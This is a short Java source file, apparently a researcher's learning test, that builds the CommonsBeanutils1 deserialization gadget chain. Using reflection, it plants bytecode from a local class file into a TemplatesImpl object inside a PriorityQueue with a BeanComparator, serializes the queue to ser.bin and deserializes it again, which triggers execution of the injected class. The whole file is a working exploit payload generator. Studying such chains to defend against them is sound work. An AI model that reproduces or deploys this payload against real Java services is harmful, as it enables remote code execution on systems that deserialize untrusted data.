package com.mechoy;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.PriorityQueue;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/4/8
 */
public class CB1Test {
    final static String path = "ser.bin";

    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"zzz");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[][] b = {classBytes()};
        bytecodes.set(templates,b);

        BeanComparator<Object> comparator = new BeanComparator<>("outputProperties");
        PriorityQueue<Object> queue = new PriorityQueue<>(2,comparator);

        Field queues = queue.getClass().getDeclaredField("queue");
        queues.setAccessible(true);
        Object[] queueArray = (Object[])queues.get(queue);
        queueArray[0] = templates;
        queueArray[1] = null;

        Field size = queue.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue,2);

        serialize(queue);
        deserialize();

    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }

    public static byte[] classBytes() throws IOException {
        FileInputStream fis = new FileInputStream("C:\\Users\\53433\\Desktop\\class\\Cattle.class");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }
}
